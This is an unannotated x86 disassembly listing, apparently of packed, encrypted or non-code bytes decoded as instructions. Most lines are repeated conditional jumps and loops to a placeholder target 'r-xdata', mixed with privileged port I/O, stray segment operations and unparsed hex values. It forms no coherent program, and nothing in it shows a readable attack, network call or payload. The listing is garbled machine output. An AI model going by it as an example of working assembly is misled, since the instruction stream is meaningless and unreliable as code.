loop r-xdata
or esp [ ecx ]
mov dl 0xb
jb r-xdata
push 0x52
loop r-xdata
sub eax 0xbe2e2e7
jb r-xdata
sbb bh [ ebp + 0x72212bb9 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or ecx edx
shl edx 0xe2
jb r-xdata
jb r-xdata
mov edx 0x88bbcc88
jb r-xdata
sbb al 0x1d
imul esp [ edi + 0xb246936 ] 0x50
jb r-xdata
or eax 0x6f721d1d
jb r-xdata
imul esp [ esi + edi * 8 + 0x1d35380a ] 0x1d
mov ch [ edi ]
jb r-xdata
sbb eax 0xb20ea76f
imul esp [ edx + ecx ] 0x1d1d35b0
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
rcr [ 0x1e9f6b84 ] 0x1
mov bh ch
or bl [ eax + 0x611d1d5d ]
out dx al
jb r-xdata
sbb cl [ edx - 0x1d1d1c1a ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
sbb eax 0xa340b1d
jb r-xdata
or bl bl
jb r-xdata
0xbc16b8a 0xf9e2
jb r-xdata
push cs
dec ebx
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
sbb eax 0x1d0a340b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ ebx - 0x3 ]
loop r-xdata
or bl [ 0xffffffffb2b3721d ]
jb r-xdata
movhps [ 0x6469721d ] xmm3
mov eax 0xe2d8d60b
jb r-xdata
jb r-xdata
mov dl 0xb
loop r-xdata
in eax dx
inc esi
cmp eax 0x22d11d1d
and [ edx + 0x72 ] esi
jb r-xdata
add ebx [ 0xffffffffee26611d ]
jb r-xdata
imul esp [ edi + 0xee80b16 ] 0x72721d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ 0x721d1d1f ]
push ss
cmpsd [ esi ] [ edi ]
jb r-xdata
imul edi [ edi + 0x16af6b1e ] 0x6b
mov eax 0x6b849788
jb r-xdata
sbb eax 0x7272721d
imul ebx [ edi - 0x7be22ed6 ] 0x6b
sbb ah [ 0xffffffffbbbbbae1 ]
jb r-xdata
loop r-xdata
sbb eax 0xa769deb4
retn 0x2267
mov esp 0x1b360bb9
jb r-xdata
retn 0x2d0b
jb r-xdata
les eax [ ecx + 0x6bb17588 ]
jb r-xdata
loop r-xdata
jb r-xdata
or edi [ ebx + ecx ]
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x225a691d
push es
jb r-xdata
inc edi
mov dl al
jb r-xdata
sbb eax 0x54ed96b4
loop r-xdata
jb r-xdata
and esp ebx
loop r-xdata
loop r-xdata
arpl [ eax ] dx
jb r-xdata
sbb eax 0x6bb1b21d
push edi
xor bl [ edi ]
sbb eax 0xe0950b1d
loop r-xdata
adc bl [ 0x2b67841d ]
or ebx [ eax + eax * 8 + 0x676fe2e2 ]
xor bl [ edi ]
jb r-xdata
push 0x1d12e10b
sbb eax 0xb2b6784
pushfd
shl dl 0xe2
pop ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
and cl [ ebx ]
pop esi
fnclex
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
imul ecx [ esi ] 0xbee0e61
fimul [ edx ]
jae r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov ebp 0x72212bb9
sbb eax 0xe2e27e72
mov ah 0xde
jb r-xdata
mov [ ebp - 0x4f ] dh
jb r-xdata
sbb eax 0xc6a66b1d
dec esi
sti
int3
jb r-xdata
sbb eax 0xe6bc6f72
jb r-xdata
in eax dx
movsb [ edi ] fs : [ esi ]
mov ch 0x6b
movsb [ edi ] [ esi ]
retn 0xea0b
loopne r-xdata
dec [ edx ]
cmp [ 0x2f8a1d1d ] dh
jb r-xdata
sbb eax 0xe2e8130b
loop r-xdata
mov ch [ ebx - 0x4a83ce97 ]
imul esp [ edx + esi * 8 + 0x1d3ae50a ] 0x1d
mov dl 0x69
and al 0xa
mov al 0x35
sbb eax 0xd0bbb1d
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
sub esp [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fadd st6
jb r-xdata
jb r-xdata
inc ebp
stc
or esi [ edx + ecx ]
or al [ esi + edi + 0x1d ]
sbb eax 0xb1ee2661
mov al ah
imul eax ecx 0xb
jb r-xdata
mov ah dh
jecxz r-xdata
pop edx
or esi [ ecx - 0x3f ]
dec esi
call 0x72b88dde
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x3a69eeb5
popad
sbb [ 0x15bb67ed ] ebx
sbb eax 0xb22d11d
inc esp
sbb eax 0xee26611d
mov cl 0x88
loopne r-xdata
mov eax 0x1d3e310b
imul esi [ edi - 0x717747f0 ] 0xffffff84
imul esi [ edi - 0x7bcd96d6 ] 0x6b
mov bh 0x28
mov edi 0x16af6b1e
jb r-xdata
test [ ebx - 0x61 ] ch
sbb cl [ eax + 0x1fe30bb4 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbee2661
jb r-xdata
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebp eax
jb r-xdata
jb r-xdata
push ss
sbb eax 0x1a6f6f1d
imul esp [ edi + 0xb908814 ] 0xf
push ebx
0x6bb515e6 0xa2a4
loop r-xdata
jb r-xdata
jne r-xdata
jb r-xdata
shl dl cl
mov cl 0xb
push cs
movsd [ edi ] [ esi ]
in eax dx
jb r-xdata
loop r-xdata
or ecx [ eax ]
jb r-xdata
xchg esi eax
jb r-xdata
sbb ebx [ 0x7272721d ]
sbb eax 0xfac30a1d
loop r-xdata
cmp al 0xb
loop r-xdata
sbb eax 0xe2225a69
or ebp [ 0xbe2e2e7 ]
jb r-xdata
jb r-xdata
jb r-xdata
aam 0x1d
jne r-xdata
mov eax [ 0x226784fe ]
in eax dx
mov dx 0xe2ec
loop r-xdata
push ebp
loop r-xdata
and [ ebx ] ecx
jb r-xdata
mov al 0xd0
sbb al 0x84
imul ebx [ edi - 0x3a05f4e8 ] 0xffffffe2
loop r-xdata
mov dl 0xb3
mov bl ah
loopne r-xdata
jb r-xdata
jb r-xdata
fucom st3
loop r-xdata
and cl [ bp + di ]
jb r-xdata
retn 0x646b
or esi [ ecx + ebx + 0x72721d1d ]
mov ah dl
loop r-xdata
loop r-xdata
xchg edi eax
or bl [ 0xffffffffe2e26675 ]
jle r-xdata
scasd [ edi ]
jb r-xdata
mov cl 0xb
jno r-xdata
or eax [ edi - 0x1a ]
push esp
loop r-xdata
mov ah 0x69
push edx
pop esi
sbb al 0xd4
loop r-xdata
mov al ah
or [ eax + 0x646bb175 ] 0xe2e2e20a
loop r-xdata
fucom st3
loop r-xdata
mov cl 0x6b
mov [ ebx + 0x36a76b84 ] bl
jb r-xdata
outsd
or esi [ ecx + 0x72e2e2e7 ]
cmpsd [ esi ] [ edi ]
or bh [ edx + 0x6b848c88 ]
scasd [ edi ]
out dx al
sbb eax 0x40b96b5
in al dx
jb r-xdata
jb r-xdata
imul esp [ edi - 0x184ef500 ] 0xffffffe2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
sub esp [ ecx ]
jb r-xdata
pop esi
loop r-xdata
xchg edi eax
out dx al
in eax dx
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
cmp eax 0x86611d1d
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp edx
jb r-xdata
rcl eax 0x1
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
or bl [ ebx ]
shl edx cl
loop r-xdata
cmpsd [ esi ] [ edi ]
0xe06a0e63 0xe2e2
mov esi 0x72e2e2f6
jb r-xdata
mov ch 0xee
imul edi [ edx ] 0xed1d1961
mov ebx 0xd11d1d15
and cl [ ebx ]
jb r-xdata
retn 0xe2e2
or al [ esi ]
jb r-xdata
out dx al
jb r-xdata
sub bl [ bx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
sbb eax 0x7272721d
in eax dx
imul esp [ edi - 0x58947bd4 ] 0x32
jb r-xdata
or eax [ ecx + 0x721d1d1e ]
mov bl 0xa
jpo r-xdata
imul ah
mov cl 0x1d
xchg esi eax
loop r-xdata
jb r-xdata
imul esp [ esi + ebx * 8 - 0x1d1c8cf6 ] 0xffffffe2
imul esp [ edx + ecx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and cl [ ebx ]
mov cl 0xff
loop r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
jb r-xdata
int1
jb r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xd0b066ed
je r-xdata
or ah [ edi ]
jb r-xdata
scasd [ edi ]
jb r-xdata
adc ah [ edi + 0x14 ]
in eax dx
sub [ esi ] dx
sbb eax 0xf2a7691d
imul edi edx 0xffffffb1
mov ah 0xb
mov ah 0xb
sbb eax 0x1d67721d
mov al al
loop r-xdata
jb r-xdata
jb r-xdata
imul ebx [ esp + eax * 4 ] 0xb189f6b
cli
mov bl 0x88
jecxz r-xdata
jb r-xdata
or esp [ ebx + 0x10 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
loop r-xdata
sbb eax 0xb772721d
or edi esi
pop ss
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb77272
jb r-xdata
jecxz r-xdata
loop r-xdata
popad
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
cli
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
or ecx [ 0x72e2e2f0 ]
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
outsb
jb r-xdata
sbb eax 0xe2e24272
loop r-xdata
or esp [ esi - 0x3ce2e2ee ]
mov esi 0xfd0bf2c6
sbb eax 0x7272721d
sub esp [ edi + 0x22 ]
in eax dx
jb r-xdata
and [ edx + 0x72 ] esi
stosb [ edi ]
cmp [ 0x7272721d ] ebx
xchg dh al
jb r-xdata
jb r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
imul esp [ edi + 0x6a0e63ea ] 0xbe2e2e0
or dl [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov cl 0x88
jb r-xdata
stc
jb r-xdata
and eax 0x721d1d1f
jb r-xdata
jb r-xdata
inc edx
pop ds
sbb eax 0x1db5b2b4
arpl bp ax
jb r-xdata
jb r-xdata
jg r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
sbb eax 0xab50e97
in ax 0xe2
loop r-xdata
loop r-xdata
arpl bp ax
sbb eax 0xe2e20674
jb r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ah dl
jb r-xdata
cmp [ esi ] eax
cmp [ ebp + 0x6ced1467 ] esi
adc ah dl
loop r-xdata
jb r-xdata
out 0x1d al
cmpsb [ esi ] [ edi ]
mov cl 0xb4
imul edx [ edx + 0x5e ] 0xd1e2e2e2
jb r-xdata
mov edx 0x69e2e2ec
mov ah 0x96
loop r-xdata
loop r-xdata
add dh ah
loop r-xdata
shl dl 0xe2
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
mov al 0xd0
or ebx [ 0x1d67721d ]
outsd
xor bl [ bx ]
imul esp ebx 0xffffffb1
or esi [ ecx + 0x1d ]
jb r-xdata
jb r-xdata
shl eax 0xe2
loop r-xdata
push ds
jb r-xdata
sbb [ 0xffffffffa66bbb1d ] bl
nop
jb r-xdata
inc esi
jb r-xdata
outsd
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
dec ebp
or dh [ 0xffffffffee8a1d1d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xb2
jb r-xdata
or ecx [ edi + 0x721d1d0d ]
jb r-xdata
lahf
jecxz r-xdata
push es
outsd
sbb eax 0x3fe30b1d
jb r-xdata
jb r-xdata
jecxz r-xdata
loop r-xdata
or esp esp
add bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
mov [ edx + 0x14af6b84 ] bl
jb r-xdata
jb r-xdata
mov dh 0xe2
jb r-xdata
sbb [ 0x6bb4bb1d ] ebx
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
sar [ edx ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and dh [ ebp + esi * 4 + 0x6b1ea76b ]
jb r-xdata
sbb eax 0x1d0ba291
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x13cb66ed
sbb eax 0x8ae6881d
or edx esi
fsub st2
or edx [ eax ]
call 0x72b88c4c
imul esp [ edi - 0xc81f4ea ] 0x7272e2e2
jb r-xdata
imul esp [ edi - 0x7bdf96ce ] 0x6b
jb r-xdata
sbb eax 0xbc6f721d
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
or edi [ 0x721d1d04 ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
pushad
adc eax 0x55ed1d1d
jb r-xdata
jb r-xdata
and ch ch
out 0xe2 al
loop r-xdata
loop r-xdata
imul esp [ esi + ebx * 4 + 0x1d1cfa0a ] 0x1d
mov ch [ ebp - 0x4a1063e7 ]
imul esp [ esi + ecx * 8 + 0x1d1ce80a ] 0x1d
mov al [ edx ]
ffreep st3
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fwait
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0x1df6c696
aam 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
mov [ 0x1d14130b ] al
sbb eax 0x2361b172
adc cl [ edx ]
imul ecx [ eax ] 0xa1691d1d
salc
stosb [ edi ]
loopne r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d1c50
jb r-xdata
jb r-xdata
and [ ebx - 0x4b ] edx
sbb eax 0x4dee8a1d
jb r-xdata
adc dh [ edx + 0x1a340bb5 ]
jb r-xdata
sbb eax 0xe2e26e74
sub esp [ es : ecx ]
jb r-xdata
mov ebp 0xe2f2770b
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
or edx [ ebx ]
call 0x72b8ae10
jb r-xdata
sub al 0x30
or esp ebx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
test [ ebx + 0x7272721d ] dh
jb r-xdata
mov ebp 0x549f6b84
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
or eax ecx
jb r-xdata
loop r-xdata
sbb eax 0xa66bb4bb
or edi [ esi + 0x721d1d01 ]
cmpsb [ esi ] [ edi ]
sbb eax 0x6bb4bb1d
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa725721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ah bl
push ds
imul esp [ edi + 0x1aa76b16 ] 0xb
jb r-xdata
jge r-xdata
mov ah 0xb5
imul esp [ edi + 0x16a76b1e ] 0x6b
jb r-xdata
mov [ 0xffffffffe2fb1d0b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b21d
imul ebp [ edi + 0x6b84bb1a ] 0xffffffaf
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
or eax [ eax + 0x72e2e2d2 ]
jb r-xdata
jb r-xdata
sbb eax 0xe2e26a74
cmpsd [ esi ] [ edi ]
mov dl 0x8a
in al 0xe2
loopne r-xdata
sbb eax 0x990bf2b5
std
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
jb r-xdata
or [ ebx ] bl
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
or ebp [ edi + 0x72e2e2f1 ]
jb r-xdata
sbb eax 0x6f56af6f
imul esp [ edx + ecx * 8 + 0x1d1f090a ] 0x1d
mov dh [ ecx - 0x4aef1484 ]
imul esp [ esi + eax * 8 + 0x1d1f3f0a ] 0x1d
mov ah [ edi - 0x4aadb82e ]
imul esp [ esi + ebp * 8 + 0x1d1f2d0a ] 0x1d
or edx [ edi - 0x39 ]
loop r-xdata
sbb ebx [ edi ]
aam 0xb5
imul esp [ edx + ebx * 2 - 0x1e ] 0xffffffe2
loop r-xdata
sahf
jb r-xdata
sbb al 0x1d
sbb eax 0xa9ea46b
cli
jb r-xdata
imul edi [ edi - 0x1381f436 ] 0xffffffe2
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x84
imul esi [ edi - 0x50947bfc ] 0x12
or ecx [ ebx + 0x72e2e2eb ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb cl [ ebx ]
fsubr st2
loop r-xdata
sbb eax 0x16751dd4
and ah bh
mov [ ebx ] ebp
out 0x58 eax
sbb eax 0x84e2e2f7
imul esi esi 0xffffffd3
imul edx [ esi - 0x59db112e ] 0xffffffd2
and ecx edx
and dh [ edx - 0x4e4d4d4e ]
lodsb [ esi ]
in al dx
loop r-xdata
jb r-xdata
or edx [ eax + 0x1c ]
jb r-xdata
mov ebx 0xe2f00d0b
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
xor ecx [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov ch dh
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
mov ah dl
loop r-xdata
push ds
loope r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745f0 ] 0xffffffbc
test [ ebx - 0x59 ] ch
push ss
mov [ esi + 0x2b0b2469 ] bh
ja r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
mov ah 0xb4
mov ah 0x6f
sbb eax 0x67ed7272
movsb [ edi ] [ esi ]
xchg edi eax
push ss
or eax [ esp + ebp * 8 ]
sbb eax 0x676fb11d
sub bl [ edi ]
sbb eax 0x676fb21d
push esi
sbb bl [ 0xffffffffb41db21d ]
0x676f
bound ebx [ edi + 0x67ede3f2 ]
sub al 0x30
aas
jb r-xdata
xchg edi eax
0xe66ae468 0xd1db
popad
jb r-xdata
jb r-xdata
jpo r-xdata
shr [ ebx ] 0x1
and ch ch
sbb eax 0x72727272
jb r-xdata
outsb
0x88e2e2e2 0x1de2
dec edx
push edx
jb r-xdata
jb r-xdata
mov [ edi - 0x60947b43 ] dl
pop esi
imul ebx [ ebx + ecx ] 0xe2e2ecb7
imul ebx [ edi - 0x425077ac ] 0xffffff84
imul ebx [ edi - 0x7be796a6 ] 0x6b
lahf
pop eax
arpl [ esi + ebx * 2 - 0x1e ] bx
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x88
jecxz r-xdata
jb r-xdata
adc al 0x69
sub cl [ ebx ]
hlt
scasd [ edi ]
jb r-xdata
cmp bl [ 0xffffffffa725721d ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2f73e0b
loop r-xdata
mul edx
jb r-xdata
mov esi 0x721d1d01
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
pop ds
outsd
cmpsd [ esi ] [ edi ]
xor dh [ edx + esi * 4 + 0x1d3edb0a ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
jb r-xdata
sub bl [ edi ]
sbb eax 0x4e676f1d
adc al 0x1d
sbb eax 0xe2f8960a
loop r-xdata
test [ ebx - 0x61 ] ch
outsd
jb r-xdata
sbb eax 0x72e2e2fb
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
or ecx [ esi - 0x18 ]
sub [ eax + 0x1d3e310b ] bh
loop r-xdata
out 0x6f al
cmpsd [ esi ] [ edi ]
sub dh [ edx - 0x1d1379f5 ]
loop r-xdata
mov cl 0xb1
jb r-xdata
jb r-xdata
loop r-xdata
push cs
jb r-xdata
loop r-xdata
jb r-xdata
int1
jb r-xdata
mov cl 0xb4
mov ebp 0x72212bb9
jb r-xdata
jmp r-xdata
shl [ edx ] 0x1
movsb [ edi ] [ esi ]
jb r-xdata
mov ebx 0xbe0b2267
adc edx [ ebx + 0x61b1721d ]
and edx [ edx ]
or ch [ ecx + 0x8 ]
sbb eax 0xd6a1691d
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ ebx + 0x721d1d00 ]
jb r-xdata
or al [ edx ]
jb r-xdata
jb r-xdata
popad
mov [ es : 0xffffffff81821c8a ] al
lgs ebp [ ebx - 0x5c ]
test [ edx ] 0x14
xor eax 0x668a1d1d
cmpsd [ esi ] [ edi ]
or [ edx + 0x1d12ad0b ] bh
sbb eax 0x72727272
jb r-xdata
mov [ edi + 0xaa76b84 ] al
mov edx 0x6b848c88
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
loop r-xdata
mov [ 0xffffffffc6e66bfa ] al
and ch ch
imul esp [ edi + 0x1ea7691a ] 0xffffffd9
cmpsd [ esi ] [ edi ]
sbb ch ch
jpe r-xdata
jb r-xdata
mov ah 0x88
retn 0xb4b4
or esi [ edi - 0xe ]
jb r-xdata
into
sbb eax 0x10560a1d
jb r-xdata
mov dh 0x19
sbb eax 0x1db4b21d
loop r-xdata
jb r-xdata
and bl [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x36676fb2
pop ds
sbb eax 0x170ab21d
pop ecx
sbb eax 0xf226611d
sub esp [ ecx ]
outsd
out 0xe2 eax
enter 0x1d13 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
std
mov ch ch
jb r-xdata
sbb eax 0x72727272
outsd
imul esp [ edi + 0x72212b1e ] 0x72727272
mov [ edi - 0x60947b43 ] ch
pop edx
imul ebx [ eax ] 0x589f6b84
test [ ebx - 0x61 ] ch
push esp
jb r-xdata
sbb eax 0xed1d671d
jb r-xdata
pushad
in eax dx
jb r-xdata
push ss
imul edi [ edi - 0x7bc396e6 ] 0x6b
mov edi 0xb3a6918
in eax dx
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
fdivr st7
loop r-xdata
xchg esi eax
xor al 0xe3
imul ebp [ edx ] 0x1d1ff40b
sbb eax 0x72727272
jb r-xdata
sbb eax 0x1ea72572
jb r-xdata
or ah dl
sbb eax 0x751db21d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x69727272
jb r-xdata
jb r-xdata
sbb eax 0x6f6fb21d
push esi
sbb bl [ 0x3b9c0a1d ]
movsw [ edi ] [ esi ]
salc
loop r-xdata
or eax [ ebx + ecx + 0x66ed1d1d ]
and edi [ 0xffffffff86611d1d ]
sub cl [ ebx ]
aam 0xce
loop r-xdata
popad
imul esp [ edi + 0x1f7d0b1a ] 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
imul ebx [ edi + 0xb1c6912 ] 0x7d
cli
loop r-xdata
jb r-xdata
or ebx [ 0x72e2e2fb ]
jb r-xdata
mov edi 0x72727221
jb r-xdata
and al 0xa7
push cs
or edx ecx
push cs
pop ds
sbb eax 0xe38ab21d
loop r-xdata
sbb eax 0xaf69ee97
0xe2e48f0b 0x72e2
or ebx [ ecx + edx * 8 + 0x7272e2e2 ]
jb r-xdata
in eax dx
jb r-xdata
sbb eax 0x72721d1d
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
loop r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
out dx al
or bh dl
mov ebx 0xba222d1
jb r-xdata
sub eax 0xe2cd1c0b
loop r-xdata
or ah [ edi + 0x1e ]
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
jb r-xdata
outsd
add [ 0x7272721d ] bl
jb r-xdata
hlt
jb r-xdata
sbb eax 0xe2887272
jb r-xdata
push ebx
loop r-xdata
jb r-xdata
pop ds
sbb eax 0x106a0a1d
push edx
jb r-xdata
popad
fsub st2
or ecx eax
mov ah 0xb4
mov ah 0xb4
mov ah 0xb
jpo r-xdata
loop r-xdata
loop r-xdata
pop ds
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
imul esp esi 0xffffffc6
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
or dl [ esi + 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
imul esp [ edi - 0x794de216 ] 0x1a612bd1
sbb eax 0xb2377ed
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ eax ] 0x6b849a88
lahf
push esi
test [ ebx - 0x61 ] ch
push eax
pop esp
or edi eax
sbb eax 0x204a67ed
jb r-xdata
jb r-xdata
loop r-xdata
mov bh 0x82
jb r-xdata
jb r-xdata
adc esi [ eax ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
and ebp ebp
jb r-xdata
jb r-xdata
or ecx [ ecx - 0x3c ]
scasd [ edi ]
push ss
mov ebx 0x6b849a88
jb r-xdata
or esi esp
jb r-xdata
and eax 0xe2e31ea7
mov dl 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xab76f72
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
sbb cl [ ebx ]
mov ch dl
or dl [ esi + 0x69e2e2f8 ]
jb r-xdata
sti
jb r-xdata
0xb16971d 0xe4b
jb r-xdata
shl edx 0xe2
jb r-xdata
shl edx 0x1
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
0x7e0b
jb r-xdata
imul esp [ edx + ebp * 8 + 0x1d1e310a ] 0x1d
mov bl [ edx ]
sbb eax 0x2267bb1d
in eax dx
xchg esi eax
sbb eax 0x17498a1d
lahf
fidiv [ ecx + 0x1d18ff0b ]
sbb eax 0xa727272
outsd
cmpsd [ esi ] [ edi ]
mov dl 0xb
mov ecx 0x72e2e2d6
mov edx 0x14a76b84
or ebp [ esp + ebp * 8 - 0x1e ]
push ds
mov dl 0x1d
jb r-xdata
sbb eax 0xcf418a1d
add ebp edi
mov ch 0x6b
movsb [ edi ] [ esi ]
0x90a
pop ds
adc [ ebp + 0xac6a46b ] dh
aas
pop ds
sbb eax 0xd2a78a1d
inc edi
or bh [ edx ]
pop ds
test [ ebx - 0x49 ] ch
add al 0x84
imul ebp [ edi - 0x1474f4ee ] 0xffffffe2
xchg ebp eax
test [ ebx - 0x59 ] ch
push es
jbe r-xdata
sbb eax 0xed727272
jb r-xdata
sbb eax 0xb2727272
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ ebp + ebx + 0x1d ] 0x72727272
jb r-xdata
sbb eax 0x107c0a1d
jb r-xdata
jb r-xdata
mov ah 0xb
sbb eax 0x9f6f721d
pop edx
outsd
outsd
push edx
pop ds
jb r-xdata
lahf
jb r-xdata
or edi ecx
out 0xe2 eax
loop r-xdata
sbb eax 0x1d107c0a
jb r-xdata
sub esp [ ecx ]
test [ ebx - 0x59 ] ch
adc [ edx - 0x7b436e78 ] bh
imul esp [ edi + 0x69be8816 ] 0x24
or ebp [ ebx ]
loop r-xdata
jb r-xdata
adc [ 0xffffffffed22671d ] bl
pop esp
sbb eax 0xd861841d
loop r-xdata
adc eax 0xe60bb51b
sub eax 0x72721d1d
in eax dx
movsb [ di ] [ si ]
jb r-xdata
jb r-xdata
sbb [ 0x1db4b21d ] ebx
sbb eax 0x7272721d
jb r-xdata
push esi
jb r-xdata
jb r-xdata
sbb [ 0x2267bb1d ] ebx
in eax dx
stosd [ di ]
pop ds
sbb eax 0x3420b1d
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
add al 0xba
or edx [ eax + 0x2d ]
sbb eax 0x66ed721d
0x8a1d1d3a 0xbbcd
pop es
jl r-xdata
mov ah 0xa
cwde
pop ebp
sbb eax 0xee26611d
and [ 0xffffffffed1d671d ] bl
jb r-xdata
in eax dx
and [ 0xfffffffff2a16f1d ] bl
dec edx
jb r-xdata
jb r-xdata
loop r-xdata
mov eax 0x6b848088
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
out 0xc6 al
jb r-xdata
mov dl 0x6f
jb r-xdata
jb r-xdata
mov al al
jb r-xdata
outsd
jb r-xdata
pop ds
sbb eax 0x7272721d
mov ebx 0x66ed2267
xchg al bh
loop r-xdata
mov edx 0x9c0bc788
loop r-xdata
jne r-xdata
jb r-xdata
push ds
dec ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e20274
jb r-xdata
popfd
cmp [ 0xe120b1d ] bl
or bl [ edi + 0x18 ]
outsd
jb r-xdata
arpl [ esi ] cx
sbb eax 0x1a61bb1d
jecxz r-xdata
je r-xdata
sbb eax 0xe2e24e74
loop r-xdata
jb r-xdata
loop r-xdata
